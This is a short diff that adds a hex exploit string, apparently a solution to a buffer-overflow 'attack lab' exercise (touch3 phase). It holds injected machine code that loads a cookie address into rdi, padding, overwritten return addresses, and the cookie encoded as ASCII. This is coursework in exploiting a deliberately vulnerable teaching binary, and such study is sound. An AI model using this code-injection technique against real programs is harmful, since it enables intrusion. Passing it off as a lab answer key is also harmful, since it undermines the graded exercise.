@@ -1,0 +1,16 @@
+/* movq location of cookie to rdi and retq */
+/* 0x5553a878 */
+48 c7 c7 88 a8 53 55 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Ret address of getbuf:0x5553a860 */
+60 a8 53 55 00 00 00 00
+
+/* Ret address of touch3:0x401e6b */ 
+6b 1e 40 00 00 00 00 00
+
+/* Hex translation of cookie: 0x33f72ca5 */
+33 33 66 37 32 63 61 35 00 
+
+
